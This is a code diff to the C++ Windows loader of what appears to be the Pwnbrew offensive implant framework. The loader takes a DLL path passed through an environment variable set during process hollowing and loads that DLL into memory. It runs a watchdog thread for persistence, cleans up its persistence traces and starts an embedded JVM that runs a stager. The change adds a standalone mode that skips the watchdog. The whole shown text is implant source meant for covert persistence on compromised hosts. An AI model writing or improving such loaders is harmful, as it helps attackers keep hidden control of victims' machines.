@@ -81,7 +81,6 @@ unsigned int __stdcall Thread_Start_JVM(void* a) {
 		free(jvm_ptr);
 	}
 	
-    //jvm_str.assign("C:\\Pwnbrew\\Loader\\Windows\\Stager.jar");
 	InvokeMain( nullptr, classPath, jvm_str.c_str());
 
 	//Set the event
@@ -242,12 +241,10 @@ int WINAPI WinMain(HINSTANCE hInstance_param,HINSTANCE hPrevInstance,LPSTR lpCmd
 {
 
 #ifdef _DBG
-	CHAR path[MAX_PATH];
-	if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_PROFILE, NULL, 0, path))) {
-		std::string str_path(path);
-		str_path.append("\\jldr.log");
-		SetLogPath(str_path.c_str());
-	}
+	std::string str_path("C:\\Users\\Public");
+	str_path.append("\\jldr.log");
+	SetLogPath(str_path.c_str());
+	
 #endif
 
 	persist_struct_ptr = (PERSIST_STRUCT *)calloc(1, sizeof(PERSIST_STRUCT));
@@ -290,6 +287,7 @@ int WINAPI WinMain(HINSTANCE hInstance_param,HINSTANCE hPrevInstance,LPSTR lpCmd
 	//Get TMP env - this is the one we set in proc hollow
 	char * tmp_env = nullptr;
 	_dupenv_s (&tmp_env, &len, tmp_ptr);
+	bool watchdog = true;
 	if( tmp_env && strlen(tmp_env) > 0 ){
 
 #ifdef _DBG
@@ -303,7 +301,8 @@ int WINAPI WinMain(HINSTANCE hInstance_param,HINSTANCE hPrevInstance,LPSTR lpCmd
 			
 		} else {
 			//Reset TMP var
-			SetEnvironmentVariable(tmp_ptr, "");
+			//SetEnvironmentVariable(tmp_ptr, "");
+			watchdog = false;
 		}
 	}
 
@@ -314,63 +313,72 @@ int WINAPI WinMain(HINSTANCE hInstance_param,HINSTANCE hPrevInstance,LPSTR lpCmd
 	std::string tmp_env_str(tmp_env);
 	free(tmp_env);
 
-	unsigned long proc_pid = 0;
-	//Find last colon if it exists
-	size_t pos = tmp_env_str.find_last_of("|");
-	if( pos != std::string::npos){
-		std::string proc_str = tmp_env_str.substr(pos + 1, std::string::npos );
-		tmp_env_str = tmp_env_str.substr(0, pos );
-		proc_pid = strtoul (proc_str.c_str(), NULL, 0);
-
-#ifdef _DBG
-		Log("[+] Watch dog pid: %d\n", proc_pid);
-#endif
-	}
-
-	//Assign DLL
-	//std::string *dllPath = new std::string(tmp_env_str);
-	persist_struct_ptr->dll_file_path.assign( tmp_env_str );
-
-	//Load DLL into memory
-	if( !ReadDllIntoMemory( persist_struct_ptr ) ){
-#ifdef _DBG
-		Log("[-] Error: Unable to read DLL into memory. Exiting\n");
-#endif
-		return 1;
-	}
-
 	//Create an event to break out 
 	HANDLE stopEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
 	PWATCHDOG_THREAD_STRUCT thread_struct = (PWATCHDOG_THREAD_STRUCT)calloc(1, sizeof(WATCHDOG_THREAD_STRUCT));
 					
 	//Set pointer to this
 	thread_struct->thread_stop_event = stopEvent;
-	thread_struct->watchdog_pid = proc_pid;
-	thread_struct->persist_ptr = persist_struct_ptr;
-						
 
-	//Start the watch dog thread for the watch dog process
-	unsigned ret;
-	HANDLE wd_thread_handle = (HANDLE)_beginthreadex(0, 0, StartWatchDog,(void*)thread_struct,0,&ret);
-	if( !(size_t)wd_thread_handle ){
-#ifdef _DBG
-		Log( "[-] Manager::Start - unabled to start watch dog thread.\n" );
-#endif
-	}
+	//Setup 
+	if( watchdog ){
 	
-	//Remove the DLL
-	RemovePersistence( persist_struct_ptr );
+		unsigned long proc_pid = 0;
+		//Find last colon if it exists
+		size_t pos = tmp_env_str.find_last_of("|");
+		if( pos != std::string::npos){
+			std::string proc_str = tmp_env_str.substr(pos + 1, std::string::npos );
+			tmp_env_str = tmp_env_str.substr(0, pos );
+			proc_pid = strtoul (proc_str.c_str(), NULL, 0);
 
-	//Start the watch dog thread for the watch dog process
-	HANDLE jvm_thread_handle = (HANDLE)_beginthreadex(0, 0, Thread_Start_JVM,(void*)thread_struct,0,&ret);
-	if( !(size_t)jvm_thread_handle ){
-#ifdef _DBG
-		Log( "[-] WinMain - unabled to start jvm thread.\n");
-#endif
-	}
+	#ifdef _DBG
+			Log("[+] Watch dog pid: %d\n", proc_pid);
+	#endif
+		}
+
+		//Assign DLL
+		persist_struct_ptr->dll_file_path.assign( tmp_env_str );
+
+		//Load DLL into memory
+		if( !ReadDllIntoMemory( persist_struct_ptr ) ){
+	#ifdef _DBG
+			Log("[-] Error: Unable to read DLL into memory. Exiting\n");
+	#endif
+			return 1;
+		}
+
+		thread_struct->watchdog_pid = proc_pid;
+		thread_struct->persist_ptr = persist_struct_ptr;						
+
+		//Start the watch dog thread for the watch dog process
+		unsigned ret;
+		HANDLE wd_thread_handle = (HANDLE)_beginthreadex(0, 0, StartWatchDog,(void*)thread_struct,0,&ret);
+		if( !(size_t)wd_thread_handle ){
+	#ifdef _DBG
+			Log( "[-] Manager::Start - unabled to start watch dog thread.\n" );
+	#endif
+		}
+	
+		//Remove the DLL
+		RemovePersistence( persist_struct_ptr );
+
+		//Start the watch dog thread for the watch dog process
+		HANDLE jvm_thread_handle = (HANDLE)_beginthreadex(0, 0, Thread_Start_JVM,(void*)thread_struct,0,&ret);
+		if( !(size_t)jvm_thread_handle ){
+	#ifdef _DBG
+			Log( "[-] WinMain - unabled to start jvm thread.\n");
+	#endif
+		}
 		
-	//Start the main window loop
-	MessageLoop();
+		//Start the main window loop
+		MessageLoop();
+	
+	} else {
+
+		//Standalone exe
+		Thread_Start_JVM(thread_struct);
+	
+	}
 
 	return 0;
 }
@@ -696,6 +704,13 @@ BOOL WINAPI InvokeMain( std::string *serviceName, std::string adsPath, const cha
 		//Free memory
 		free(jvmPath);
 		return FALSE;	
+	} else {
+	
+#ifdef _DBG
+		//Print status
+		Log("Loaded JVM Library.");					
+#endif
+	
 	}
 		
 	//Free memory
@@ -735,8 +750,7 @@ BOOL WINAPI InvokeMain( std::string *serviceName, std::string adsPath, const cha
 	
 #ifdef _DBG
 		Log( "JVM created.\n");
-#endif
-	
+#endif	
 	}
 
 	//Find the java class
